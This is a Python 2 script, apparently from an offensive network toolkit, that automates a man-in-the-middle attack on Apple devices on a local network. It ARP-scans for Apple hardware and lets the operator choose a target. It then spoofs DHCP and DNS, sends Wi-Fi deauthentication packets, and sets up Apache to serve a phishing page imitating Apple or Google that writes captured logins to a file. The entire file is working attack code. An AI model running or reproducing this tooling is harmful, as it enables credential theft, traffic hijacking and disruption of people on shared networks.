#!/usr/bin/env python

from base import Base
from os import path, errno, makedirs, remove
from shutil import copyfile, copytree
import subprocess as sub
from argparse import ArgumentParser
from sys import exit
from time import sleep, time
from ipaddress import IPv4Address
import re

Base = Base()
Base.check_user()
Base.check_platform()

parser = ArgumentParser(description='Apple DHCP MiTM creator')

parser.add_argument('-i', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
parser.add_argument('-c', '--use_network_conflict', action='store_true', help='Use network conflict technique')
parser.add_argument('-t', '--use_tid_calculate', action='store_true', help='Use transaction id calculate technique')

parser.add_argument('-f', '--fishing_domain', type=str, default="auth.apple.wi-fi.com",
                    help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
parser.add_argument('-p', '--fishing_domain_path', type=str, default="apple",
                    help='Set local path to domain name for social engineering (default="apple")')

parser.add_argument('-r', '--aireplay_iface', type=str, help='Set interface name for aireplay')
parser.add_argument('-d', '--deauth', type=int, help='Set number of deauth packets (dafault=35)', default=35)
parser.add_argument('-k', '--kill', action='store_true', help='Kill process')
parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)


args = parser.parse_args()

sub.Popen(["kill -9 $(ps aux | grep dhcp_rogue_server.py | grep -v grep | awk '{print $2}') 2>/dev/null"],
          shell=True)
sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep | awk '{print $2}') 2>/dev/null"],
          shell=True)
sub.Popen(["kill -9 $(ps aux | grep dnschef | grep -v grep | awk '{print $2}') 2>/dev/null"],
          shell=True)

if args.kill:
    exit(0)

Base.print_banner()

number_of_deauth = str(args.deauth)
listen_network_interface = None
aireplay_network_interface = None
apple_devices = []

if args.listen_iface is None:
    print Base.c_warning + "Set listen network interface:"
    listen_network_interface = Base.netiface_selection()
else:
    listen_network_interface = args.listen_iface

your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
if your_ip_address is None:
    print Base.c_error + "Network interface: " + listen_network_interface + " do not have IP address!"
    exit(1)

if not args.use_network_conflict:
    if not args.use_tid_calculate:
        if args.aireplay_iface is None:
            print Base.c_warning + "Set aireplay network interface:"
            aireplay_network_interface = Base.netiface_selection()
        else:
            aireplay_network_interface = args.aireplay_iface

        if aireplay_network_interface == listen_network_interface:
            print Base.c_error + "Network interface for listening and aireplay must be differ!"
            exit(1)

if __name__ == "__main__":

    # region Social engineering

    # Disable ipv4 forwarding
    ipv4_forward_file_name = "/proc/sys/net/ipv4/ip_forward"
    with open(ipv4_forward_file_name, 'w') as ipv4_forward_file:
        ipv4_forward_file.write("0")

    # Variables
    script_dir = path.dirname(path.realpath(__file__))
    apache2_sites_available_dir = "/etc/apache2/sites-available/"
    apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
    apache2_sites_path = "/var/www/html/"
    redirect_path = apache2_sites_path + "redirect/"

    se_domain = args.fishing_domain
    if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
        se_path = apache2_sites_path + args.fishing_domain_path
    else:
        se_path = args.fishing_domain_path

    print Base.c_info + "Fishing domain: " + Base.cINFO + se_domain + Base.cEND
    print Base.c_info + "Fishing path: " + Base.cINFO + se_path + Base.cEND

    # Directory for fishing site
    if not path.exists(se_path):
        if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
            copytree(src=script_dir + "/Fishing_domains/" + args.fishing_domain_path, dst=se_path)
        else:
            print Base.c_error + "Directory: \"" + se_path + "\" does not exist!"
            exit(1)

    sub.Popen(['chmod 777 ' + se_path + '/logins.txt >/dev/null 2>&1'], shell=True)

    # region Apache2 sites settings
    default_site_file_name = "000-default.conf"
    default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
    default_site_file.write("<VirtualHost *:80>\n" +
                            "\tServerAdmin admin@apple.com\n" +
                            "\tRewriteEngine on\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-f\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-d\n" +
                            "\tRewriteRule ^(.*)$ /redirect.php?page=$1 [NC]\n" +
                            "\tDocumentRoot " + redirect_path + "\n" +
                            "\t<Directory " + redirect_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n\n" +
                            "<VirtualHost *:80>\n" +
                            "\tServerName " + se_domain + "\n" +
                            "\tServerAdmin admin@" + se_domain + "\n" +
                            "\tDocumentRoot " + se_path + "\n" +
                            "\t<Directory " + se_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n")
    default_site_file.close()

    # Create dir with redirect script
    if not path.isdir(redirect_path):
        makedirs(redirect_path)

    # Copy and change redirect script
    redirect_script_name = "redirect.php"
    redirect_script_src = script_dir + "/Tools/" + redirect_script_name
    redirect_script_dst = redirect_path + redirect_script_name

    copyfile(src=redirect_script_src, dst=redirect_script_dst)

    # Read redirect script
    with open(redirect_script_dst, 'r') as redirect_script:
        content = redirect_script.read()

    # Replace the string
    content = content.replace('change_me', se_domain)

    # Write redirect script
    with open(redirect_script_dst, 'w') as redirect_script:
        redirect_script.write(content)

    try:
        print Base.c_info + "Restarting apache2 server ..."
        sub.Popen(['systemctl restart apache2  >/dev/null 2>&1'], shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            print Base.c_error + "Program: systemctl is not installed!"
            exit(1)
        else:
            print Base.c_error + "Something went wrong while trying to run `systemctl reload apache2`"
            exit(2)
    # endregion

    # region Dnschef settings
    dns = "77.88.8.8"
    try:
        sub.Popen(['dnschef -i ' + your_ip_address + ' --fakeip=' + your_ip_address +
                   ' >' + script_dir + '/dnschef.log 2>&1'],
                  shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            print Base.c_error + "Program: dnschef is not installed!"
            exit(1)
        else:
            print Base.c_error + "Something else went wrong while trying to run `dnschef`"
            exit(2)
    # endregion

    ######################################### DEBUG #############################################
    #exit(0)
    #############################################################################################

    # endregion

    print Base.c_info + "Listen network interface: " + Base.cINFO + listen_network_interface + Base.cEND

    first_ip = Base.get_netiface_first_ip(listen_network_interface)
    last_ip = Base.get_netiface_last_ip(listen_network_interface)

    print Base.c_info + "First ip address: " + Base.cINFO + first_ip + Base.cEND
    print Base.c_info + "Last ip address: " + Base.cINFO + last_ip + Base.cEND

    if not args.use_network_conflict:
        if not args.use_tid_calculate:
            print Base.c_info + "Aireplay network interface: " + Base.cINFO + aireplay_network_interface + Base.cEND

            bssid = None
            essid = None
            channel = None
            freq = None

            try:
                iwgetid = sub.Popen(['iwgetid -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                essid, essid_err = iwgetid.communicate()
                iwgetid = sub.Popen(['iwgetid -a -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                bssid, bssid_err = iwgetid.communicate()
                iwgetid = sub.Popen(['iwgetid -c -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                channel, channel_err = iwgetid.communicate()
                iwgetid = sub.Popen(['iwgetid -f -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                freq, freq_err = iwgetid.communicate()

                essid = essid.rstrip()
                bssid = bssid.rstrip()
                channel = channel.rstrip()
                freq = freq.rstrip()

                if essid is None or essid == "":
                    print Base.c_error + "Network interface: " + listen_network_interface + " not connected to AP!"
                    exit(1)
            except OSError as e:
                if e.errno == errno.ENOENT:
                    print Base.c_error + "Program: iwgetid is not installed!"
                    exit(1)
                else:
                    print Base.c_error + "Something else went wrong while trying to run `iwgetid`"
                    exit(2)

            print Base.c_info + "ESSID interface " + listen_network_interface + ": " + Base.cINFO + essid + Base.cEND
            print Base.c_info + "BSSID interface " + listen_network_interface + ": " + Base.cINFO + bssid + Base.cEND
            print Base.c_info + "Channel interface " + listen_network_interface + ": " + Base.cINFO + channel + Base.cEND
            print Base.c_info + "Frequency interface " + listen_network_interface + ": " + Base.cINFO + freq + Base.cEND

            print Base.c_info + "Monitor mode for interface: " + aireplay_network_interface + " channel: " + channel + " ..."
            try:
                sleep(1)
                sub.Popen(['airmon-ng stop ' + aireplay_network_interface + 'mon'], shell=True, stdout=sub.PIPE)
                sleep(1)
                sub.Popen(['airmon-ng start ' + aireplay_network_interface + ' ' + channel], shell=True, stdout=sub.PIPE)
            except OSError as e:
                if e.errno == errno.ENOENT:
                    print Base.c_error + "Program: iwconfig or ifconfig is not installed!"
                    exit(1)
                else:
                    print Base.c_error + "Something else went wrong while trying to run `iwconfig` or `ifconfig`"
                    exit(2)

    print Base.c_info + "ARP scan is running ..."
    arp_scan_out = None
    try:
        arp_scan = sub.Popen(['arp-scan --macfile=' + script_dir + '/apple_mac_prefixes.txt -I ' +
                              listen_network_interface + ' --localnet --ignoredups --retry=5 --timeout=1000'],
                             shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        arp_scan_out, arp_scan_err = arp_scan.communicate()
    except OSError as e:
        if e.errno == errno.ENOENT:
            print Base.c_error + "Program: arp-scan is not installed!"
            exit(1)
        else:
            print Base.c_error + "Something else went wrong while trying to run `arp-scan`"
            exit(2)

    if arp_scan_out is not None:
        ip_addresses = []
        ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

        for device in arp_scan_out.splitlines():
            if "Apple" in device:
                apple_devices.append(device.split())
            try:
                if ip_pattern.match(device.split()[0]):
                    ip_addresses.append(device.split()[0])
            except IndexError:
                pass

        if len(apple_devices) > 0:
            print Base.c_info + "Apple devices found:"
            device_index = 1
            for apple_device in apple_devices:
                print Base.c_success + str(device_index) + ") " + apple_device[0] + " (" + apple_device[1] + ")"
                device_index += 1

            device_index -= 1
            current_device_index = raw_input('Set device index from range (1-' + str(device_index) + '): ')

            if not current_device_index.isdigit():
                print Base.c_error + "Your input data is not digit!"
                exit(1)

            if any([int(current_device_index) < 1, int(current_device_index) > device_index]):
                print Base.c_error + "Your number is not within range (1-" + str(device_index) + ")"
                exit(1)

            current_device_index = int(current_device_index) - 1
            print Base.c_info + "Target: " + Base.cINFO + apple_devices[current_device_index][0] + " (" + \
                                apple_devices[current_device_index][1] + ")" + Base.cEND
            apple_device = apple_devices[current_device_index]

            # Set new IP address for target
            new_ip = ""
            if args.new_ip is not None:
                if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.new_ip)) <= IPv4Address(unicode(last_ip)):
                    new_ip = args.new_ip
                else:
                    args.new_ip = None
            if args.new_ip is None:
                new_ip = None
                index = 1
                while new_ip is None:
                    check_ip = str(IPv4Address(unicode(first_ip)) + index)
                    if check_ip not in ip_addresses:
                        new_ip = check_ip
                    else:
                        index += 1
                index = 0
            print Base.c_info + "Target new ip: " + Base.cINFO + new_ip + Base.cEND


            if args.use_tid_calculate:
                try:
                    sub.Popen(['python ' + script_dir + '/apple_rogue_dhcp.py -i ' + listen_network_interface +
                               ' -t ' + apple_device[1] + ' -I ' + new_ip + ' -q &'],
                              shell=True)
                    sleep(3)
                    sub.Popen(['python ' + script_dir + '/network_conflict_creator.py -i ' +
                               listen_network_interface + ' -I ' + apple_device[0] + ' -t ' + apple_device[1] +
                               ' -q'], shell=True)
                except OSError as e:
                    if e.errno == errno.ENOENT:
                        print Base.c_error + "Program: python is not installed!"
                        exit(1)
                    else:
                        print Base.c_error + "Something else went wrong while trying to run `dhcp_rogue_server.py`"
                        exit(2)

            if args.use_network_conflict:
                try:
                    sub.Popen(['python ' + script_dir + '/dhcp_rogue_server.py -i ' + listen_network_interface +
                               ' -f ' + first_ip + ' -l ' + last_ip + ' -t ' + apple_device[1] + ' -q --apple &'],
                              shell=True)
                    sub.Popen(['python ' + script_dir + '/network_conflict_creator.py -i ' +
                               listen_network_interface + ' -I ' + apple_device[0] + ' -t ' + apple_device[1] +
                               ' -q'], shell=True)
                except OSError as e:

                    if e.errno == errno.ENOENT:
                        print Base.c_error + "Program: python is not installed!"
                        exit(1)
                    else:
                        print Base.c_error + "Something else went wrong while trying to run `dhcp_rogue_server.py`"
                        exit(2)

            if not args.use_network_conflict:
                if not args.use_tid_calculate:
                    print Base.c_info + "Send " + number_of_deauth + " deauth packets to: " + apple_device[1]
                    print Base.c_info + 'Command: aireplay-ng ' + aireplay_network_interface + 'mon -0 ' + \
                          number_of_deauth + ' -a ' + bssid + ' -c ' + apple_device[1] + ' &'
                    try:
                        aireplay_err = ""
                        aireplay = sub.Popen(['aireplay-ng ' + aireplay_network_interface + 'mon -0 ' + number_of_deauth +
                                              ' -a ' + bssid + ' -c ' + apple_device[1] + ' &'],
                                             shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                        aireplay_out, aireplay_err = aireplay.communicate()

                        if aireplay_err != "":
                            print Base.c_error + "Aireplay error: "
                            print aireplay_err
                            exit(1)
                    except OSError as e:

                        if e.errno == errno.ENOENT:
                            print Base.c_error + "Program: aireplay-ng is not installed!"
                            exit(1)
                        else:
                            print Base.c_error + "Something else went wrong while trying to run `aireplay-ng`"
                            exit(2)
            try:
                rogue_server_is_run = True
                start = time()
                while rogue_server_is_run:
                    if (int(time() - start) > 120):
                        sub.Popen(["kill -9 $(ps aux | grep dhcp_rogue_server.py | grep -v grep |" +
                                   " awk '{print $2}') 2>/dev/null"], shell=True)
                        sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep |" +
                                   " awk '{print $2}') 2>/dev/null"], shell=True)

                    if args.use_tid_calculate:
                        ps = sub.Popen(['ps aux | grep "apple_rogue_dhcp" | grep -v grep'],
                                       shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                    else:
                        ps = sub.Popen(['ps aux | grep "dhcp_rogue_server" | grep -v grep'],
                                       shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                    ps_out, ps_err = ps.communicate()
                    if ps_out == "":
                        rogue_server_is_run = False
                    else:
                        sleep(5)
            except OSError as e:

                if e.errno == errno.ENOENT:
                    print Base.c_error + "Program: ps is not installed!"
                    exit(1)
                else:
                    print Base.c_error + "Something else went wrong while trying to run `ps`"
                    exit(2)
        else:
            print Base.c_error + "Apple devices not found!"
    else:
        print Base.c_error + "Output of arp-scan is empty!"
